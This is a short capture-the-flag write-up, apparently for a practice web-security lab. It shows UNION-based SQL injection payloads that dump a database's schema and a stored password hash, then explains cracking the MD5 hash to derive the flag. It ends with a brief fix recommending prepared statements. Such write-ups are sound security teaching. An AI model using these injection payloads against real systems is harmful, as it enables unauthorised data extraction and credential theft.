On "Members", by passing the SQL request:
"5 or 1=1 UNION SELECT table_schema, table_name FROM INFORMATION_SCHEMA.tables"

We get the following dbs and table_name:

Member_Brute_Force.db_default
Member_Sql_Injection.users
Member_guestbook.guestbook
Member_images.list_images
Member_survey.vote_dbs

Then by passing the SQL request:
"5 or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns"

We get the following columns in each tables:

table_name : db_default
column_name: id
column_name: username
column_name: password

table_name : users
column_name: user_id
column_name: first_name
column_name: last_name
column_name: town
column_name: country
column_name: planet
column_name: Commentaire
column_name: countersign

table_name : guestbook
column_name: id_comment
column_name: comment
column_name: name

table_name : list_images
column_name: id
column_name: url
column_name: title
column_name: comment

table_name : vote_dbs
column_name: id_vote
column_name: vote
column_name: nb_vote
column_name: subject

Moreover by passing the SQL request:
"5 or 1=1 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users"

We get 1 interesting result:

Commentaire: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
countersign: 5ff9d0165b4f92b14994e5c685cdce28

Finally, we use md5 reverse on countersign and get "FortyTwo".
Last but not least, we lowercase and use sh256 on "fortytwo".
And get the flag.

# RESOLUTION

- Protect string in the server to prevent from SQL injection.
- Use prepared statements and parameterized queries. (For example: PDO, MySQLi).